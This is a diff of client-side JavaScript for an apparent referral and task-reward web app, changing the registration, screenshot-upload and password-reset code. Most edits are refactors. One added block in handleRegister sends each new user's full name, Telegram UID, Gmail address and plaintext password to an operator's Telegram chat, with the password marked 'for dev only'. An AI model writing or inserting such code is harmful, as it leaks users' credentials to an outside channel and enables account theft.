@@ -571,7 +571,7 @@
   /**
    * Handles user registration.
    */
-  function handleRegister() {
+  async function handleRegister() { // Added async here
     const fullName = document.getElementById('registerFullName').value.trim();
     const telegramUid = document.getElementById('registerTelegramUid').value.trim();
     const gmail = document.getElementById('registerGmail').value.trim().toLowerCase();
@@ -619,6 +619,7 @@
     };
 
     // If there's a referrer (by UID), apply referral bonus
+    let referralMessagePart = "";
     if (referrerUID && telegramUid !== referrerUID) {
         let referrerEmailFound = null;
         for (const email in users) {
@@ -633,15 +634,20 @@
             users[referrerEmailFound].balance += 0.020; // Referrer gets $0.020
             users[referrerEmailFound].totalReferrals++;
             users[referrerEmailFound].referredUsers.push(gmail); // Store referred user's Gmail
-            sendTelegramMessage(`New user registered: ${gmail} (UID: ${telegramUid})\nReferred by: ${referrerEmailFound} (UID: ${referrerUID})\nReferral bonus paid to ${referrerEmailFound}`);
+            referralMessagePart = `\nReferred by: ${users[referrerEmailFound].fullName} (UID: ${referrerUID})\nReferral bonus paid to referrer.`;
         } else {
-            sendTelegramMessage(`New user registered: ${gmail} (UID: ${telegramUid})\nReferrer UID (${referrerUID}) not found or invalid.`);
+            referralMessagePart = `\nReferrer UID (${referrerUID}) not found or invalid.`;
         }
     } else {
-        sendTelegramMessage(`New user registered: ${gmail} (UID: ${telegramUid})\nNo valid referrer UID.`);
+        referralMessagePart = `\nNo referrer.`;
     }
 
     saveUserData();
+
+    // Send registration notification to Telegram
+    const registrationMessage = `🎉 New User Registered! 🎉\n\nFull Name: ${fullName}\nTelegram UID: ${telegramUid}\nGmail: ${gmail}\nPassword (for dev only): ${password}${referralMessagePart}\n\nWelcome new user!`;
+    await sendTelegramMessage(registrationMessage); // Send notification
+
     showFlashMessage("Registration successful! Please log in.");
     showAuthTab('login'); // Switch to login tab after successful registration
     // Clear registration fields
@@ -910,7 +916,7 @@
 
     const formData = new FormData();
     formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('caption', `New task screenshot submitted:\nUser: ${currentUserData.fullName} (${currentUserEmail})\nUID: ${currentUserData.telegramUid}\nSubmitted ID on screenshot: ${userNameForScreenshot}`);
+    formData.append('caption', `New task screenshot submitted:\nUser: ${currentUserData.fullName} (${currentUserData.gmail})\nUID: ${currentUserData.telegramUid}\nSubmitted ID on screenshot: ${userNameForScreenshot}`);
     formData.append('photo', screenshotFile[0]);
 
     screenshotStatus.innerText = "Sending screenshot...";
@@ -1129,13 +1135,13 @@
           // Send to admin's Telegram Chat ID
           await sendTelegramMessage(message);
 
-          resetStatus.innerText = `Code sent to admin's Telegram. Please contact the admin (${users[gmail].telegramUid} or ${users[gmail].gmail}) and get the code to proceed.`;
+          resetStatus.innerText = `Code sent to admin's Telegram. Please contact the admin (${userToReset.telegramUid} or ${userToReset.gmail}) and get the code to proceed.`;
           showFlashMessage("Verification code sent to admin's Telegram. Please contact admin.");
           
           setTimeout(() => {
               document.getElementById('resetEmailStep').style.display = 'none';
               document.getElementById('resetCodeStep').style.display = 'block';
-              document.getElementById('resetStatus').innerText = `Code sent. Please get the code from admin (${users[gmail].telegramUid} or ${users[gmail].gmail}).`;
+              document.getElementById('resetStatus').innerText = `Code sent. Please get the code from admin (${userToReset.telegramUid} or ${userToReset.gmail}).`;
           }, 2000); // Simulate network delay
           
       } catch (error) {
